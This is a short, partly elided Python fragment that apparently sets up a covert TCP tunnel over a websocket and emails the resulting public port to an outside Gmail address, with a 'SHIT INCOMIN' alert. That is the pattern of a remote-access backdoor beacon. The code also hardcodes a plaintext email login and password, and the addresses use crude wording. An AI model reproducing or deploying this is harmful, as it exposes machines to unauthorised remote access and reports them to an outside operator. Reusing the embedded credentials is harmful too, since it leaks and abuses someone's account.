...
srv.ehlo()
srv.login("ahmedjobory47@gmail.com", "xnxx2005")
srv.sendmail("ahmedjobory47@gmail.com", "xloli2006x@gmail.com", "SHIT INCOMIN")
...
async def open_tcp_tunnel(ws_uri, remote_server_host, local_server_port):
    async with websockets.connect(ws_uri, ssl=ssl_context) as websocket:
        ...
        srv.sendmail("ahmedjobory47@gmail.com", "xloli2006x@gmail.com", str(public_server_port))
